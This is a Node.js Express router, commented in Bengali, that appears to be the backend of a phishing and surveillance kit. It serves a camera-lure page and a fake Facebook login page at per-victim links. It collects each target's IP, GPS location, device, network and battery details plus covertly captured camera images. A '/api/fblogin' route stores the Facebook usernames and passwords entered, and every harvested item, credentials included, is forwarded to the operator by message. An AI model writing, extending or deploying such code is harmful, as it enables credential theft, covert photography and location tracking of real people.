const express = require('express');
const path = require('path');
const router = express.Router();
const Victim = require('../models/Victim');
const { getConfig, sendMessage, formatVictimData } = require('../utils/helpers');

// ===== ক্যামেরা লিঙ্ক ভিজিট =====
router.get('/v/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/index.html'));
    } catch (err) {
        console.error('Error serving victim page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ===== ফেক ফেসবুক লিঙ্ক ভিজিট =====
router.get('/fb/:id', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('লিঙ্কটি ভুল বা মেয়াদোত্তীর্ণ।');
        }
        res.sendFile(path.join(__dirname, '../public/fb.html'));
    } catch (err) {
        console.error('Error serving fb page:', err);
        res.status(500).send('সার্ভার ত্রুটি');
    }
});

// ===== ভিক্টিম ডেটা রিসিভ =====
router.post('/api/victim', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 ভিক্টিম ডেটা পেয়েছি:', JSON.stringify(data, null, 2));

        // ডেটা ভ্যালিডেশন
        if (!data.id) {
            console.error('❌ id নেই!');
            return res.status(400).json({ status: 'error', message: 'Missing id' });
        }

        // fbId না থাকলে 'unknown' সেট করি
        if (!data.fbId) {
            data.fbId = 'unknown';
        }

        let victim = await Victim.findOne({ id: data.id });

        if (!victim) {
            // নতুন ভিক্টিম তৈরি
            victim = new Victim({
                id: data.id,
                fbId: data.fbId,
                type: data.type || 'camera',
                timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
                ip: data.ip || null,
                location: data.location || null,
                gpsLocation: data.gpsLocation || null,
                device: data.device || {},
                media: data.media || [],
                network: data.network || {},
                battery: data.battery || null,
                collectedAt: new Date()
            });
            await victim.save();
            console.log(`✅ নতুন ভিক্টিম তৈরি: ${data.id}`);
        } else {
            // আপডেট
            victim.ip = data.ip || victim.ip;
            victim.location = data.location || victim.location;
            victim.gpsLocation = data.gpsLocation || victim.gpsLocation;
            victim.device = data.device || victim.device;
            victim.media = data.media || victim.media;
            victim.network = data.network || victim.network;
            victim.battery = data.battery || victim.battery;
            victim.collectedAt = new Date();
            await victim.save();
            console.log(`✅ ভিক্টিম আপডেট: ${data.id}`);
        }

        // ইউজারকে মেসেজ পাঠান (যদি fbId থাকে)
        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = formatVictimData(victim);
            await sendMessage(victim.fbId, msg);
            console.log(`📤 মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
        } else {
            console.log('⚠️ fbId নেই বা unknown, মেসেজ পাঠানো হয়নি');
        }

        res.status(200).json({ status: 'ok', data: victim });

    } catch (err) {
        console.error('❌ Victim data error:', err);
        // বিস্তারিত এরর লগ
        if (err.name === 'ValidationError') {
            console.error('Validation Error:', err.errors);
            return res.status(400).json({ status: 'error', message: 'Validation Error', errors: err.errors });
        }
        res.status(500).json({ status: 'error', message: err.message, stack: err.stack });
    }
});

// ===== ক্যামেরা ছবি রিসিভ =====
router.post('/api/camera', async (req, res) => {
    try {
        const { id, image } = req.body;
        if (!id || !image) {
            return res.status(400).json({ status: 'error', message: 'Missing id or image' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        if (!victim.camera) victim.camera = [];
        victim.camera.push({
            image: image,
            timestamp: new Date()
        });
        await victim.save();

        console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${victim.camera.length}টি)`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            await sendMessage(victim.fbId, `📸 ক্যামেরা থেকে ${victim.camera.length}টি ছবি সংগ্রহ করা হয়েছে।`);
        }

        res.status(200).json({ status: 'ok', count: victim.camera.length });

    } catch (err) {
        console.error('❌ Camera error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ===== ইমেজ ভিউ =====
router.get('/image/:id/:index', async (req, res) => {
    try {
        const victim = await Victim.findOne({ id: req.params.id });
        if (!victim) {
            return res.status(404).send('ভিক্টিম পাওয়া যায়নি');
        }
        const index = parseInt(req.params.index);
        if (isNaN(index) || index < 0 || index >= victim.camera.length) {
            return res.status(404).send('ছবি পাওয়া যায়নি');
        }
        const imgData = victim.camera[index].image;
        res.send(`<img src="data:image/jpeg;base64,${imgData}" style="max-width:100%;" />`);
    } catch (err) {
        console.error('Image view error:', err);
        res.status(500).send('এরর');
    }
});

// ===== ফেক ফেসবুক লগইন ডেটা =====
router.post('/api/fblogin', async (req, res) => {
    try {
        const { id, username, password } = req.body;
        if (!id || !username || !password) {
            return res.status(400).json({ status: 'error', message: 'Missing data' });
        }

        const victim = await Victim.findOne({ id: id });
        if (!victim) {
            return res.status(404).json({ status: 'error', message: 'Victim not found' });
        }

        victim.fbLogin = {
            username: username,
            password: password,
            timestamp: new Date(),
            ip: req.ip || req.connection.remoteAddress || 'N/A'
        };
        await victim.save();

        console.log(`🔐 ফেক লগইন ডেটা: ${id} - ${username}`);

        if (victim.fbId && victim.fbId !== 'unknown') {
            const msg = `🔐 **ফেক ফেসবুক লগইন ডেটা!**\n\n📧 ইমেইল/ফোন: ${username}\n🔑 পাসওয়ার্ড: ${password}\n🆔 ভিক্টিম আইডি: ${id}`;
            await sendMessage(victim.fbId, msg);
        }

        res.status(200).json({ status: 'ok' });

    } catch (err) {
        console.error('❌ FB Login error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

module.exports = router;